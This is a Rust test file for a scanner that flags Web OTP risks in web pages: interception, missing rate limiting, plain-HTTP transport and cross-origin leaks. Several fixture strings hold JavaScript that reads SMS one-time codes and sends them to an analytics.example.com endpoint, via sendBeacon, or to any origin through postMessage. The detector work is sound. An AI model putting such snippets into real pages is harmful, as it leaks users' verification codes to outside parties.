use crate::web_otp_audit::*;

#[test]
fn test_no_api_returns_empty() {
    let body = r#"
        <html>
            <body>
                <input type="text" name="username" />
                <button>Submit</button>
            </body>
        </html>
    "#;
    let issues = analyze_web_otp(body);
    assert!(issues.is_empty());
}

#[test]
fn test_otp_credential_detected() {
    let body = r#"
        <script>
            if ('OTPCredential' in window) {
                navigator.credentials.get({ otp: { transport: ['sms'] } });
            }
        </script>
    "#;
    let issues = analyze_web_otp(body);
    assert_eq!(issues, vec![WebOtpIssue::ApiDetected]);
}

#[test]
fn test_autocomplete_one_time_code() {
    let body = r#"
        <input type="text" autocomplete="one-time-code" name="otp" />
    "#;
    let issues = analyze_web_otp(body);
    assert_eq!(issues, vec![WebOtpIssue::ApiDetected]);
}

#[test]
fn test_navigator_credentials_get() {
    let body = r#"
        <script>
            navigator.credentials.get({ otp: { transport: ['sms'] } })
                .then(otp => verifyOtp(otp.code));
        </script>
    "#;
    let issues = analyze_web_otp(body);
    assert!(issues.contains(&WebOtpIssue::ApiDetected));
}

#[test]
fn test_otp_interception_with_fetch() {
    let body = r#"
        <script>
            navigator.credentials.get({ otp: { transport: ['sms'] } })
                .then(otp => {
                    fetch('https://analytics.example.com/track', {
                        method: 'POST',
                        body: JSON.stringify({ code: otp.code })
                    });
                });
        </script>
    "#;
    let issues = analyze_web_otp(body);
    assert!(issues.contains(&WebOtpIssue::ApiDetected));
    assert!(issues.contains(&WebOtpIssue::OtpInterception));
}

#[test]
fn test_otp_interception_with_send_beacon() {
    let body = r#"
        <script>
            const otp = document.getElementById('otp').value;
            navigator.sendBeacon('/analytics', JSON.stringify({ token: otp }));
        </script>
    "#;
    let issues = analyze_web_otp(body);
    assert!(issues.contains(&WebOtpIssue::ApiDetected));
    assert!(issues.contains(&WebOtpIssue::OtpInterception));
}

#[test]
fn test_otp_interception_with_xhr() {
    let body = r#"
        <script>
            const xhr = new XMLHttpRequest();
            xhr.open('POST', '/log');
            xhr.send(JSON.stringify({ otp: code }));
        </script>
    "#;
    let issues = analyze_web_otp(body);
    assert!(issues.contains(&WebOtpIssue::ApiDetected));
    assert!(issues.contains(&WebOtpIssue::OtpInterception));
}

#[test]
fn test_no_rate_limiting_on_verify() {
    let body = r#"
        <script>
            function verifyOtp(code) {
                fetch('/api/verify', {
                    method: 'POST',
                    body: JSON.stringify({ otp: code })
                });
            }
        </script>
    "#;
    let issues = analyze_web_otp(body);
    assert!(issues.contains(&WebOtpIssue::ApiDetected));
    assert!(issues.contains(&WebOtpIssue::NoRateLimiting));
}

#[test]
fn test_no_rate_limiting_on_validate() {
    let body = r#"
        <script>
            otp.validate(code);
        </script>
    "#;
    let issues = analyze_web_otp(body);
    assert!(issues.contains(&WebOtpIssue::ApiDetected));
    assert!(issues.contains(&WebOtpIssue::NoRateLimiting));
}

#[test]
fn test_rate_limiting_present() {
    let body = r#"
        <script>
            if (attemptCount > 3) {
                return 'Too many attempts';
            }
            verify(otp);
        </script>
    "#;
    let issues = analyze_web_otp(body);
    assert!(issues.contains(&WebOtpIssue::ApiDetected));
    assert!(!issues.contains(&WebOtpIssue::NoRateLimiting));
}

#[test]
fn test_insecure_transport_http() {
    let body = r#"
        <script>
            fetch('http://api.example.com/verify', {
                method: 'POST',
                body: JSON.stringify({ otp: code })
            });
        </script>
    "#;
    let issues = analyze_web_otp(body);
    assert!(issues.contains(&WebOtpIssue::ApiDetected));
    assert!(issues.contains(&WebOtpIssue::InsecureTransport));
}

#[test]
fn test_cross_origin_risk_with_post_message() {
    let body = r#"
        <script>
            const otp = document.getElementById('otp').value;
            window.parent.postMessage({ otp: otp }, '*');
        </script>
    "#;
    let issues = analyze_web_otp(body);
    assert!(issues.contains(&WebOtpIssue::ApiDetected));
    assert!(issues.contains(&WebOtpIssue::CrossOriginRisk));
}

#[test]
fn test_cross_origin_risk_with_iframe() {
    let body = r#"
        <iframe src="https://partner.com/otp-handler"></iframe>
        <script>
            const otp = getOTPCredential();
        </script>
    "#;
    let issues = analyze_web_otp(body);
    assert!(issues.contains(&WebOtpIssue::ApiDetected));
    assert!(issues.contains(&WebOtpIssue::CrossOriginRisk));
}

#[test]
fn test_multiple_issues_detected() {
    let body = r#"
        <script>
            navigator.credentials.get({ otp: { transport: ['sms'] } })
                .then(otp => {
                    fetch('http://analytics.example.com/track', {
                        method: 'POST',
                        body: JSON.stringify({ code: otp.code })
                    });
                    verify(otp.code);
                    window.postMessage({ otp: otp.code }, '*');
                });
        </script>
    "#;
    let issues = analyze_web_otp(body);
    assert!(issues.contains(&WebOtpIssue::ApiDetected));
    assert!(issues.contains(&WebOtpIssue::OtpInterception));
    assert!(issues.contains(&WebOtpIssue::NoRateLimiting));
    assert!(issues.contains(&WebOtpIssue::InsecureTransport));
    assert!(issues.contains(&WebOtpIssue::CrossOriginRisk));
    assert_eq!(issues.len(), 5);
}

#[test]
fn test_display_impl() {
    assert_eq!(WebOtpIssue::ApiDetected.to_string(), "api_detected");
    assert_eq!(WebOtpIssue::OtpInterception.to_string(), "otp_interception");
    assert_eq!(WebOtpIssue::NoRateLimiting.to_string(), "no_rate_limiting");
    assert_eq!(WebOtpIssue::InsecureTransport.to_string(), "insecure_transport");
    assert_eq!(WebOtpIssue::CrossOriginRisk.to_string(), "cross_origin_risk");
}

#[test]
fn test_severity_values() {
    assert_eq!(web_otp_severity(&WebOtpIssue::ApiDetected), 2.0);
    assert_eq!(web_otp_severity(&WebOtpIssue::OtpInterception), 8.0);
    assert_eq!(web_otp_severity(&WebOtpIssue::NoRateLimiting), 7.0);
    assert_eq!(web_otp_severity(&WebOtpIssue::InsecureTransport), 7.5);
    assert_eq!(web_otp_severity(&WebOtpIssue::CrossOriginRisk), 6.0);
}

#[test]
fn test_to_operations() {
    let issues = vec![
        WebOtpIssue::ApiDetected,
        WebOtpIssue::OtpInterception,
    ];
    let mut seq = 100;
    let ops = web_otp_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 102);
}
